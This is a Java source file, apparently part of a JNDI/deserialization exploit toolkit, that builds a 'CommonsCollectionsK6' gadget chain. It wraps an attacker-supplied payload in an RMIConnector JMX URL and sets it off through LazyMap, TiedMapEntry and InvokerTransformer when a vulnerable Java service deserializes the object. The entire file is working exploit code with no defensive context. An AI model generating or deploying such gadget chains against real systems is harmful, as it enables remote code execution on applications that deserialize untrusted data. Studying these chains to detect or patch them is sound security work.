package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Reflections;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.util.HashMap;
import java.util.Map;

public class commonscollectionsk6 implements ObjectPayload<Object>{

    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        String        command       = param[0];
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        Reflections.setFieldValue(jmxServiceURL, "urlPath", "/stub/" + command);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);

        HashMap<Object, Object> map          = new HashMap<>();
        Map<Object, Object>     lazyMap      = LazyMap.lazyMap(map, new ConstantTransformer(1));
        TiedMapEntry            tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);

        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "nu1r");
        lazyMap.remove(rmiConnector);

        Reflections.setFieldValue(lazyMap, "factory", invokerTransformer);

        return expMap;
    }
}
